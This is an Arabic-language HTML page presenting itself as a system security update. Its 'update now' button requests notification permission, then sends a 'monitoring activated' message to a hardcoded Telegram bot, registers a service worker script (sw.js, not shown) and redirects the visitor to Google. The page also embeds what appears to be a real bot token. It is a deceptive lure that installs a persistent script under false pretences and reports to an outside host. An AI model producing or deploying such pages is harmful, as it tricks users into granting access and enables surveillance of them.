<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث النظام</title>
    <style>
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; }
        button { background: #007bff; color: white; border: none; padding: 15px 35px; border-radius: 10px; font-size: 18px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h2>تحديث الأمان جاهز</h2>
        <p>اضغط أدناه لتحديث خدمات النظام</p>
        <button id="btn">تحديث الآن</button>
    </div>

    <script>
        const botToken = '8530728105:AAFIsTnKIKmwOnUxFvna_6IXnxT7wqKtsrE';
        const chatId = '7802385639';

        document.getElementById('btn').onclick = function() {
            Notification.requestPermission().then(perm => {
                if (perm === 'granted') {
                    // إرسال رسالة فورية للبوت للتأكد من العمل
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("✅ تم تفعيل المراقبة بنجاح!")}`);
                    
                    // تسجيل السكربت sw.js
                    navigator.serviceWorker.register('sw.js?v=' + Date.now());
                    
                    alert("بدأ التحديث...");
                    window.location.href = "https://www.google.com";
                } else {
                    alert("يجب السماح بالإشعارات لإكمال التحديث.");
                }
            });
        };
    </script>
</body>
</html>
